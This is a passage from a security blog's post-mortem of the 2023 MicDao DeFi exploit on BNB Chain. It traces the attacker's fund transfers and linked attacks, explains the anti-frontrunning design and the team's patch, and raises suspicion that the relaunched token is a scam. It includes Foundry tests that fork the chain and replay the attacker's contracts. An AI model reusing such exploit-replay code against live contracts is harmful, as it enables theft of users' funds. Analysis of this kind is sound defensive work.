+<p>After this attack concluded, on the same day (October 22nd), approximately 12k USDT was transferred to address <a href="https://bscscan.com/address/0xF610e3A4eF3b19b9cF8Dc88E4Cc26B2f96EC1410">0xf610</a>. On the following day, October 23rd, approximately 56k USDT and 1.8 BNB were transferred to address <a href="https://bscscan.com/address/0xa5b92a7abebf701b5570db57c5d396622b6ed348">0xa5b9</a>.</p>
+<p>As of the time of writing this article, there have been no further transactions from this address, and most of the profit funds have already been transferred out.</p>
+<hr />
+<p>By tracing the addresses interacting with the MicDai attacker's address reveals that this seems to be a crazy hacker who frequently launches an attack, with at least the following attacks present.</p>
+<ul>
+<li><a href="https://bscscan.com/address/0xcd03ed98868a6cd78096f116a4b56a5f2c67757d">0xcd03</a></li>
+<li>HTC 09/28/2023</li>
+<li>MicDao 10/18/2023</li>
+<li>BOS 10/22/2023</li>
+<li><a href="https://bscscan.com/address/0x547fb3db0f13eed5d3ff930a0b61ae35b173b4b5">0x547f</a></li>
+<li>SUT 07/21/2023</li>
+<li>BTCMT 07/23/2023</li>
+<li><a href="https://bscscan.com/address/0x181ed57a3da2d68971bef20409a1f1237f2727cc">0x181e</a></li>
+<li>CLASSIC 09/28/2023</li>
+<li><a href="https://bscscan.com/address/0xe9f2e8a1e956051ffa6709109854739a9be22d12">0xe9f2</a></li>
+<li>NFTT 12/08/2023</li>
+</ul>
+<p>Furthermore, the interaction chain between addresses is complex. Funds are frequently transferred between multiple addresses, and situations where one address creates contracts that another address calls are also observed.</p>
+<h2 id="misc">Misc</h2>
+<p>Now, let's delve into some miscellaneous aspects of the MicDao attack.</p>
+<h3 id="frontrunning-protection">Frontrunning Protection</h3>
+<p>From the previous analysis, it is evident that the attacker has launched multiple attacks, displaying a high level of expertise, and seemingly avoiding frontrunning.</p>
+<p>In the case of the MicDao attack, the attacker deployed three contracts in total.</p>
+<p><img alt="Misc" src="../../image/231018_MicDao.assets/0503.png" /></p>
+<p><img alt="Misc" src="../../image/231018_MicDao.assets/0526.png" /></p>
+<p>Upon decompilation, it becomes clear that these contracts were designed specifically for the MicDao attack. However, the first two contracts appear to have issues. For instance, the second contract is nearly identical to the third one used for the actual attack, except that the initial USDT amount for exchanging MicDao is set at 400k, and the number of contract creations for 'swap' is increased to 150.</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">testFirstAttackContract</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">attackBlockNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">32711519</span><span class="p">;</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">    </span>vm<span class="p">.</span>rollFork<span class="p">(</span>attackBlockNumber<span class="p">);</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">    </span>vm<span class="p">.</span>startPrank<span class="p">(</span><span class="mh">0xCD03ed98868A6cd78096F116A4b56a5f2C67757d</span><span class="p">,</span><span class="w"> </span><span class="mh">0xCD03ed98868A6cd78096F116A4b56a5f2C67757d</span><span class="p">);</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">    </span><span class="p">(</span><span class="kt">bool</span><span class="w"> </span><span class="nv">success</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="mh">0x19925F6f3Fd654Fe98c0a16D751E24Dd176AE8f9</span><span class="p">).</span>call<span class="p">(</span>hex<span class="s2">&quot;8a27ecfb&quot;</span><span class="p">);</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span>success<span class="p">);</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="p">}</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="kt">function</span><span class="w"> </span><span class="nv">testSecondAttackContract</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">attackBlockNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">32711643</span><span class="p">;</span>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="w">    </span>vm<span class="p">.</span>rollFork<span class="p">(</span>attackBlockNumber<span class="p">);</span>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="w">    </span>vm<span class="p">.</span>startPrank<span class="p">(</span><span class="mh">0xCD03ed98868A6cd78096F116A4b56a5f2C67757d</span><span class="p">,</span><span class="w"> </span><span class="mh">0xCD03ed98868A6cd78096F116A4b56a5f2C67757d</span><span class="p">);</span>
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="w">    </span>vm<span class="p">.</span>txGasPrice<span class="p">(</span><span class="m m-Decimal">3000300501</span><span class="p">);</span>
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">beforeAttack</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0xA5b92A7abebF701B5570db57C5d396622B6Ed348</span><span class="p">));</span>
+</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="w">    </span><span class="p">(</span><span class="kt">bool</span><span class="w"> </span><span class="nv">success</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="mh">0x0697B5dc2365e2735Bc1F086E097bcf0c61f518d</span><span class="p">).</span>call<span class="p">(</span>hex<span class="s2">&quot;8a27ecfb&quot;</span><span class="p">);</span>
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span>success<span class="p">);</span>
+</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Total USDT profit&quot;</span><span class="p">,</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0xA5b92A7abebF701B5570db57C5d396622B6Ed348</span><span class="p">))</span><span class="w"> </span><span class="o">-</span><span class="w"> </span>beforeAttack<span class="p">,</span><span class="w"> </span>usdt<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="p">}</span>
+</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a>
+</span><span id="__span-5-20"><a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="kt">function</span><span class="w"> </span><span class="nv">testThirdAttackContract</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-5-21"><a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">attackBlockNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">32711700</span><span class="p">;</span>
+</span><span id="__span-5-22"><a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a><span class="w">    </span>vm<span class="p">.</span>rollFork<span class="p">(</span>attackBlockNumber<span class="p">);</span>
+</span><span id="__span-5-23"><a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a><span class="w">    </span>vm<span class="p">.</span>startPrank<span class="p">(</span><span class="mh">0xCD03ed98868A6cd78096F116A4b56a5f2C67757d</span><span class="p">,</span><span class="w"> </span><span class="mh">0xCD03ed98868A6cd78096F116A4b56a5f2C67757d</span><span class="p">);</span>
+</span><span id="__span-5-24"><a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a><span class="w">    </span>vm<span class="p">.</span>txGasPrice<span class="p">(</span><span class="m m-Decimal">3000300501</span><span class="p">);</span>
+</span><span id="__span-5-25"><a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">beforeAttack</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0xA5b92A7abebF701B5570db57C5d396622B6Ed348</span><span class="p">));</span>
+</span><span id="__span-5-26"><a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a><span class="w">    </span><span class="p">(</span><span class="kt">bool</span><span class="w"> </span><span class="nv">success</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="mh">0x502b4A51ca7900F391d474268C907B110a277d6F</span><span class="p">).</span>call<span class="p">(</span>hex<span class="s2">&quot;8a27ecfb&quot;</span><span class="p">);</span>
+</span><span id="__span-5-27"><a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span>success<span class="p">);</span>
+</span><span id="__span-5-28"><a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Total USDT profit&quot;</span><span class="p">,</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0xA5b92A7abebF701B5570db57C5d396622B6Ed348</span><span class="p">))</span><span class="w"> </span><span class="o">-</span><span class="w"> </span>beforeAttack<span class="p">,</span><span class="w"> </span>usdt<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-5-29"><a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>Simulating this would result in an error. It's evident that 150 'swap' operations would require 300k, in addition to the 400k USDT needed for the exchange, totaling 700k USDT, whereas the DoDo pool holds less than 700k USDT. It's puzzling why such illogical contract logic was deployed to the chain.</p>
+<p>Upon analyzing the pseudocode, it's clear that the attacker implemented anti-frontrunning logic. For example, the final profits are not directly sent to the sender but to another address. Additionally, the <code>require</code> statements restrict <code>tx.origin</code> and <code>gasPrice</code> for transactions. However, it's worth mentioning that this seems like a relatively standard approach, raising questions about why it wasn't been frontrun.</p>
+<p>(On a side note, due to the use of gasPrice restrictions, the logic in the decompiled code generated by dedaub may have certain issues, which can be analyzed in conjunction with ethervm decompilation.)</p>
+<h3 id="patch">Patch</h3>
+<p><img alt="" src="../../image/231018_MicDao.assets/3214.png" /></p>
+<p>Approximately an hour after the attack, the MicDao team took action to salvage the remaining funds in the pair. They first called <code>rescueTokens</code> to withdraw all LP tokens and then used <code>removeLiquidity</code> to remove liquidity from the pair, obtaining approximately 5.5k USDT.</p>
+<p><img alt="" src="../../image/231018_MicDao.assets/3252.png" /></p>
+<p>The next day, on October 19th, they called the <code>changeRouterAddress</code> function to disable the <code>swap</code> functions.</p>
+<h3 id="scam">Scam?</h3>
+<p>It's worth noting that the project team's address <a href="https://bscscan.com/address/0x6a83ab2666e76e39e4b30e65c9159621f27b8ba9">0x6a83</a> made a transfer to address <a href="https://bscscan.com/address/0x1572f6db906eef7bcb0992ccdfdcf2bc80eb5154">0x1572</a> eventually.</p>
+<p>Checking this address reveals that the project team created <a href="https://bscscan.com/address/0x02D5558060144c1EEf3e9F290e46eb0A77ab7Cb8">new MicDao tokens</a>, a <a href="https://bscscan.com/address/0xB3ca970B7091234A7C36EEc53695F934EAbB565e">new pair</a>, and a <a href="https://bscscan.com/address/0x696cB70286002718fe880eD80EB9461E0FD76447">new intermediary contract</a> for the <code>swap</code> operation.</p>
+<p>Upon a brief analysis, it becomes evident that the new contract includes restrictions on <code>codesize</code> for callers.</p>
+<p><img alt="Misc" src="../../image/231018_MicDao.assets/3325.png" /></p>
+<p>(However, it is apparent that the restrictions can be easily bypassed.)</p>
+<p>Furthermore, unlike before, the <code>_transfer</code> function for the new token is as follows:</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_transfer</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">sender</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">recipient</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">amount</span><span class="p">)</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span>override<span class="w"> </span><span class="p">{</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">    </span><span class="kt">if</span><span class="p">(</span>pairList<span class="p">[</span>recipient<span class="p">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span>isDelivers<span class="p">[</span>sender<span class="p">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sender<span class="o">!=</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)){</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">toSwap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>amount<span class="p">.</span>mul<span class="p">(</span><span class="m m-Decimal">70</span><span class="p">).</span>div<span class="p">(</span><span class="m m-Decimal">100</span><span class="p">);</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">        </span>super<span class="p">.</span>_transfer<span class="p">(</span>sender<span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>toSwap<span class="p">);</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="w">        </span>swapTokensForToken<span class="p">(</span>toSwap<span class="p">);</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="w">        </span>amount<span class="w"> </span><span class="o">=</span><span class="w"> </span>amount<span class="p">.</span>sub<span class="p">(</span>toSwap<span class="p">);</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="w">    </span>super<span class="p">.</span>_transfer<span class="p">(</span>sender<span class="p">,</span><span class="w"> </span>recipient<span class="p">,</span><span class="w"> </span>amount<span class="p">);</span>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>When users directly transfer tokens to the pair for exchange or liquidity provision, 70% of the tokens are immediately exchanged by the token contract in advance. This seems highly unreasonable, equivalent to reducing the user's token holdings by 70%, and the origin exchange was frontrun, inflating the price. But on the flip side, it prevents attacks similar to the previous one.</p>
+<p>As a result, while regular users can acquire MicDao tokens at a fixed price, selling them directly would result in a clear loss. This raises concerns and suspicions about whether this is a fraudulent project.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../230905_HeavensGate_JumpFarm_QuantumWN/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 230905-HeavensGate-JumpFarm-QuantumWN">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                230905-HeavensGate-JumpFarm-QuantumWN
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../231206_TIME/" class="md-footer__link md-footer__link--next" aria-label="Next: 231206-TIME">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                231206-TIME
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.footer", "content.code.copy", "search.suggest", "search.highlight", "search.share"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+        <script src="../../javascripts/katex.js"></script>
+      
+        <script src="https://unpkg.com/katex@0/dist/katex.min.js"></script>
+      
+        <script src="https://unpkg.com/katex@0/dist/contrib/auto-render.min.js"></script>
+      
+    
+  </body>
+</html>
